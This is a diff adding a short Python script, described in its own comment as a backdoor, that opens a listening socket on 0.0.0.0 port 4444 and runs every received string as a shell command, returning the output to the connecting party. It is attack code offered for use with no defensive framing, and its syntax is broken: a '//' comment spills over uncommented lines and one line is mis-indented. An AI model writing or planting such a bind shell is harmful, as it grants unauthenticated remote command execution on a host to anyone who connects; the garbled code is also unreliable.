@@ -1,0 +1,47 @@
+//This script creates a simple server that listens for incoming connections.
+When a connection is established, it allows the remote user to execute shell
+commands on the host system.
+
+
+import socket
+
+import subprocess
+
+def execute_command(command):
+
+    return subprocess.check_output(command, shell=True)
+
+def start_backdoor(host, port):
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.bind((host, port))
+
+    s.listen(1)
+
+    
+
+    while True:
+conn, addr = s.accept()
+
+        print(f"Connection from: {addr}")
+
+        
+
+        while True:
+
+            data = conn.recv(1024).decode()
+
+            if not data:
+
+                break
+
+            output = execute_command(data)
+
+            conn.send(output)
+
+        
+
+        conn.close()
+
+start_backdoor("0.0.0.0", 4444)
